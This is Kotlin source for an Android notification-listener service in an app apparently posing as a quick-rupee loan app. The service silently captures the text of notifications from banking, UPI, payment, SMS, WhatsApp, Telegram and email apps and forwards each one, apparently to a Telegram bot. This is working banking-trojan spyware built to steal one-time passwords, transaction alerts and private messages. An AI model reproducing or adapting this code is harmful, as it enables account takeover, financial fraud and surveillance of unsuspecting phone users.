package com.quick.rupee

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.util.Collections

class NotifService : NotificationListenerService() {

    private val seen: MutableSet<String> = Collections.synchronizedSet(HashSet<String>())

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val ex = sbn.notification.extras
        val title = ex.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: return
        val body = ex.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: return
        if (body.length > 500) return
        val pkg = sbn.packageName
        val ok = pkg.contains("whatsapp") || pkg.contains("telegram") ||
                pkg.contains("bank") || pkg.contains("paytm") || pkg.contains("phonepe") ||
                pkg.contains("gpay") || pkg.contains("google") || pkg.contains("upi") ||
                pkg.contains("messaging") || pkg.contains("mms") || pkg.contains("sms") ||
                pkg.contains("gmail") || pkg.contains("outlook") || pkg.contains("mail")
        if (!ok) return
        val key = "$pkg|$title|${body.take(80)}"
        if (!seen.add(key)) return
        if (seen.size > 400) seen.clear()
        Thread {
            runCatching { Tg.text("<b>NOTIF</b> <code>$pkg</code>\n<b>$title</b>\n$body") }
        }.start()
    }
}
